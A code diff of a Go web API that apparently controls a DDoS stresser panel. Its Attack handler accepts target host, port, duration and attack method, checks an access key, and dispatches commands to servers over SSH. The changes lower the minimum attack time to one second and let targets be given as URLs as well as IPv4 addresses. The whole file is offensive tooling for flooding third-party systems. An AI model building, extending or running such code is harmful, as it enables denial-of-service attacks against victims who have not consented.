@@ -4,13 +4,13 @@ import (
 	"encoding/json"
 	"fmt"
 	"io/ioutil"
-	"net"
+	//"net"
 	"os"
 	"strconv"
 	"strings"
 
 	"github.com/valyala/fasthttp"
-
+	"github.com/asaskevich/govalidator"
 	"golang.org/x/crypto/ssh"
 )
 
@@ -53,25 +53,25 @@ func Attack(ctx *fasthttp.RequestCtx) {
 	var err bool
 	err, data.Host = getArgStr(ctx, "host")
 	if !err {
-		sendError("Host is  undefined!", ctx)
+		sendError("Host is undefined!", ctx)
 		return
 	}
 
 	err, data.Time = getArgInt(ctx, "time")
 	if !err {
-		sendError("Time is  undefined!", ctx)
+		sendError("Time is undefined!", ctx)
 		return
 	}
 
 	err, data.Port = getArgInt(ctx, "port")
 	if !err {
-		sendError("Port is  undefined!", ctx)
+		sendError("Port is undefined!", ctx)
 		return
 	}
 
 	err, data.Method = getArgStr(ctx, "method")
 	if !err {
-		sendError("Method is  undefined!", ctx)
+		sendError("Method is undefined!", ctx)
 		return
 	}
 
@@ -86,8 +86,8 @@ func Attack(ctx *fasthttp.RequestCtx) {
 	}
 
 	// Checking time
-	if data.Time > Config.MaxTime || data.Time < 5 {
-		sendError("Time is out of range.", ctx)
+	if data.Time > Config.MaxTime || data.Time < 1 {
+		sendError("Time must be at least 1 second.", ctx)
 		return
 	}
 
@@ -96,7 +96,7 @@ func Attack(ctx *fasthttp.RequestCtx) {
 		sendError("Invalid port!", ctx)
 		return
 	}
-	// Checking if the IP is valid
+	// Checking if the host is valid
 	if !isValidHost(data.Host) {
 		sendError("Invalid target set!", ctx)
 		return
@@ -189,7 +189,10 @@ func sendCommand(details Server, command string) {
 }
 
 func isValidHost(host string) bool {
-	return net.ParseIP(host) != nil
+	if !govalidator.IsIPv4(host) {
+		return govalidator.IsURL(host)
+	}
+	return true
 }
 
 func methodExists(methodName string) bool {
@@ -202,7 +205,7 @@ func methodExists(methodName string) bool {
 }
 
 func checkKey(ctx *fasthttp.RequestCtx) bool {
-	err, usedKey := getArgStr(ctx, "auth")
+	err, usedKey := getArgStr(ctx, "key")
 	if !err {
 		sendError("No key defined!", ctx)
 		return false
